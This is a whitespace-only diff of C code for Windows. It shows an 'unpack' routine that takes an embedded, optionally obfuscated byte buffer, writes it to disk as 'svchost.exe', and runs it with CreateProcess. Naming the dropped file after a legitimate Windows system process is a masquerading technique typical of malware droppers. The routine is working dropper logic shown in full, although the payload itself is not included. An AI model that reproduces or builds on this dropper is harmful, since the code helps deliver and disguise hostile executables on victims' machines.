@@ -9,9 +9,9 @@
 
 int unpack()
 {
-    SIZE_T size = sizeof(packed);
+	SIZE_T size = sizeof(packed);
 
-    BYTE *base = packed;
+	BYTE *base = packed;
 
 #ifdef OBFUSCATE
 	base = deobfuscate(base, size, (SIZE_T)REAL_SIZE);
@@ -20,7 +20,7 @@ int unpack()
 	size = (SIZE_T)REAL_SIZE;
 #endif
 
-    HANDLE file =
+	HANDLE file =
 		CreateFile("svchost.exe", GENERIC_WRITE | GENERIC_READ, 0, NULL,
 			   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
@@ -33,18 +33,18 @@ int unpack()
 
 	if (!write_ok)
 		return GetLastError();
-    
+
 #ifdef OBFUSCATE
 	if (!clean(base))
 		return GetLastError();
 #endif
 
 	STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+	PROCESS_INFORMATION pi;
 
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
 
 	if (CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL,
 			  &si, &pi) == 0)
